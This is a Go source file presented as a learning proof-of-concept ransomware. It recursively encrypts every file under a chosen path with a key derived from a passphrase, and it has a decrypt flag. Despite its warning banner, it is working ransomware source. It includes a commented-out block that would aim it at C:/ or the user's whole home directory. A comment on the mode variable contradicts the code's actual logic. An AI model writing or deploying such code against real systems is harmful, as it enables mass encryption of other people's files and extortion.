package main

/*
This is a proof of concept for a simple ransomware written in Go. The purpose of this project is to get familiar with the language, this means that the code is poorly written and organized.

**DO NOT USE THIS ON SYSTEMS WHERE YOU DON'T HAVE THE PERMISSION OF THE OWNER**

You can then run the executable with the following flags:
-target to specify a folder or a file to encrypt/decrypt. If it's a directory, all the files contained in the given folder will be encrypted/decrypted.
-secret to specify the secret which is used to derive the key for the encryption/decryption.
-decrypt to be specified if we want to decrypt a file or a folder.
*/

import (
    "flag"
    "fmt"
    "log"
    "os"
    "path/filepath"
    "sync"
    "goransom/utils"
)

// Declaring variables
var (
    // wait group -> used for go routines
    wg sync.WaitGroup

    // mode: encrypting if true, decrypting if false
    mode bool

    // secret -> used to derive key for encryption/decryption
    secret string

    // target folder to encrypt/decrypt
    target string
)

func init() {

    // flags
    flag.BoolVar(&mode, "decrypt", false, "-decrypt")
    flag.StringVar(&secret, "secret", "", "-secret=your_secret")
    flag.StringVar(&target, "target", "", "-target=your_path_target")
    flag.Parse()

    // Check if a secret is set
    if len(secret) == 0 {
	log.Fatal("Invalid secret, try: --secret=your_secret")
    }

    // This is not a true ransomware...
    if len(target) == 0 {
	log.Fatal("Please specify a target.")
    }

    /* EVIL APPROACH?
    if runtime.GOOS == "windows" {
	target = "C:/"
    } else {
	target = "/home/" + os.Getenv("USER")
    }
    */
}

// File Encrypt/decrypt
func ransomware(filePath string, secretKey []byte) {

    defer wg.Done()

    // check that the path exists
    _, err := os.Stat(filePath)
    if err != nil {
	log.Fatal(err)
    }

    // if encryption mode
    if !mode {
	utils.Encrypt(filePath, secretKey)

	// if decryption mode
    } else {
	utils.Decrypt(filePath, secretKey)
    }
}

// Take a path and recursively encrypt/decrypt
func start(path string) {
    defer wg.Done()

    // derive key for encryption/decryption from given secret
    key := utils.DeriveKey(secret)

    // check that the target path exists
    pathInfo, err := os.Stat(path)
    if err != nil {
	log.Fatal(err)
    }

    // check if folder or file
    switch mo := pathInfo.Mode(); {

    // folder case
    case mo.IsDir():

	// filepath.walk calls a specified function for every file or folder
	// in a file tree, see https://golang.org/pkg/path/filepath/#Walk
	// in our case, we will call start itself on every element in the path
	filepath.Walk(path, func(relativePath string, info os.FileInfo, err error) error {
	    fmt.Println("Operating on",relativePath)

	    // perform operation only if it's a file
	    if info.Mode().IsRegular(){

		// add a goroutine and start encrypting
		wg.Add(1)
		go ransomware(relativePath, key[:])
	    }
	    return nil
	})

    // file case
    case mo.IsRegular():

	// add a goroutine and start encrypting
	wg.Add(1)
	go ransomware(path,key[:])
    }
}

func main() {

    // Increment waiting group
    wg.Add(1)

    // go routine for encrypting
    go start(target)
    wg.Wait()
}
